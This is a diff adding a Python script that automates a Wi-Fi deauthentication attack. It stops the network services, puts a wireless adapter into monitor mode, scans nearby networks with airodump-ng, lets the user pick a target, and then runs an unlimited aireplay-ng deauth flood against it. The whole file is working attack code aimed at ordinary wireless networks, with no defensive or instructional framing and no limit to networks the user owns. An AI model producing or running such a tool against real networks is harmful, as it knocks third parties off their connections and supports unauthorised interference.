@@ -1,0 +1,118 @@
+#!/usr/bin/env python3
+import subprocess
+import re
+import csv
+import os
+import time
+import shutil
+from datetime import datetime
+
+# Ensure script runs as root
+if os.geteuid() != 0:
+    print("Please run this script as root (sudo).")
+    exit()
+
+# Kill NetworkManager and wpa_supplicant to avoid conflicts
+subprocess.run(["systemctl", "stop", "NetworkManager"])
+subprocess.run(["systemctl", "stop", "wpa_supplicant"])
+
+# Create a backup directory for old CSV files
+for file in os.listdir():
+    if file.endswith(".csv"):
+        if not os.path.exists("backup"):
+            os.mkdir("backup")
+        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
+        shutil.move(file, f"backup/{timestamp}-{file}")
+
+# Detect Wi-Fi interfaces
+wlan_pattern = re.compile("^wlan[0-9]+")
+interfaces = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
+
+if not interfaces:
+    print("No Wi-Fi adapter detected. Please connect one and try again.")
+    exit()
+
+# Display available Wi-Fi interfaces
+print("Available Wi-Fi Interfaces:")
+for i, iface in enumerate(interfaces):
+    print(f"{i} - {iface}")
+
+# Let the user select an interface
+while True:
+    try:
+        choice = int(input("Select the interface (number): "))
+        if choice in range(len(interfaces)):
+            break
+    except ValueError:
+        pass
+    print("Invalid selection, try again.")
+
+hacknic = interfaces[choice]
+
+# Set interface to monitor mode
+print(f"Enabling monitor mode on {hacknic}...")
+subprocess.run(["airmon-ng", "start", hacknic])
+
+# Start scanning for networks
+print("Starting scan... Press Ctrl+C when ready to select a target.")
+scan_process = subprocess.Popen(["airodump-ng", "-w", "scan", "--write-interval", "1", "--output-format", "csv", hacknic + "mon"],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+active_networks = []
+
+try:
+    while True:
+        time.sleep(1)
+        for file in os.listdir():
+            if file.endswith(".csv"):
+                with open(file) as f:
+                    reader = csv.DictReader(f, fieldnames=['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key'])
+                    for row in reader:
+                        if row["BSSID"] == "BSSID" or row["BSSID"] == "Station MAC":
+                            continue
+                        if row["ESSID"] and row not in active_networks:
+                            active_networks.append(row)
+
+        subprocess.call("clear", shell=True)
+        print("No |\tBSSID              |\tChannel|\tESSID")
+        print("___|\t___________________|\t_______|\t______________________________")
+        for i, net in enumerate(active_networks):
+            print(f"{i}\t{net['BSSID']}\t{net['channel'].strip()}\t{net['ESSID']}")
+
+except KeyboardInterrupt:
+    print("\nScan complete. Select a target.")
+
+# Stop the scan
+scan_process.terminate()
+subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
+
+# Let user select a target network
+while True:
+    try:
+        target_choice = int(input("Select the target network (number): "))
+        if target_choice in range(len(active_networks)):
+            break
+    except ValueError:
+        pass
+    print("Invalid selection, try again.")
+
+target_bssid = active_networks[target_choice]["BSSID"]
+target_channel = active_networks[target_choice]["channel"].strip()
+
+# Restart monitor mode on the correct channel
+subprocess.run(["airmon-ng", "start", hacknic, target_channel])
+
+# Start deauthentication attack
+print(f"Starting deauth attack on {target_bssid}...")
+subprocess.run(["aireplay-ng", "--deauth", "0", "-a", target_bssid, hacknic + "mon"])
+
+# User needs to manually stop the attack
+print("Deauthentication attack running... Press Ctrl+C to stop.")
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    print("\nStopping attack.")
+    subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
+    subprocess.run(["systemctl", "start", "NetworkManager"])
+    subprocess.run(["systemctl", "start", "wpa_supplicant"])
